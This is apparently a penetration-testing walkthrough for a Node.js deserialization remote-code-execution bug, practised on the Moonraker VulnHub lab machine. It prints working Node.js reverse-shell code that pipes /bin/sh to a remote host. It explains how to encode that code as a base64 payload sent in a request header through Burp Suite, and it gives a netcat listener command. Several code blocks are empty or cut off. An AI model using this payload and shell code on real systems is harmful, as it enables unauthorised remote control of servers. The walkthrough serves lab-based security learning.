# Node.js Deserialization RCE Bug

Reference: https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/

Test the exploit: https://www.vulnhub.com/entry/moonraker-1,264/

This bug requires us to build a payload using `msfvenom` or copy the one from here. We base64 encode it and pass it as a header value using Burp Suite that will open a reverse shell to our attacker machine.

The RCE.js code provided by the OPSecCX page is in the format like so,

The decimal numbers are actually character ASCII codes. If decoded/translated, the show the actual JS code as,
```
var net = require('net');
var spawn = require('child_process').spawn;
HOST="127.0.0.1";
PORT="1337";
TIMEOUT="5000";
if (typeof String.prototype.contains === 'undefined') { String.prototype.contains = function(it) { return this.indexOf(it) != -1; }; }
function c(HOST,PORT) {
    var client = new net.Socket();
    client.connect(PORT, HOST, function() {
        var sh = spawn('/bin/sh',[]);
        client.write("Connected!\n");
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
        sh.on('exit',function(code,signal){
          client.end("Disconnected!\n");
        });
    });
    client.on('error', function(e) {
        setTimeout(c(HOST,PORT), TIMEOUT);
    });
}
c(HOST,PORT);
```

To decode, Simply paste them into the "Decimal" section of this page, [Converting numbers to ASCII and vise-versa](https://www.rapidtables.com/convert/number/ascii-hex-bin-dec-converter.html)

Then, in the "ASCII Text" section, change the port number, "PORT=" (if need be), and the "HOST=" values to your target system's PORT and IP. As we change them, the decimal values will be automatically updated and we can just copy the text from the Decimal section once fully completed. Once we have the numbers, we update the RCE JS code,

Next, we simply paste the numbers back into the RCE.js code as,

Now, we can encode this using the Base64 encoder in WeakNet LINUX,
```
root@attacker-machine:~# cat RCE.js | base64 -w0

root@attacker-machine:~# 
```
That long encoded string gets placed into the header passed to the server. In the Moonraker VM test for this exploit, that is the `profile` value which, in Burp Suite would look like so,
```
GET / HTTP/1.1

Make sure that before sending this HTTP request off, that you start the listener on your attacker machine. In my case I made the port `443`,
```
root@attacker-machine:~# nc -lvvnp 443
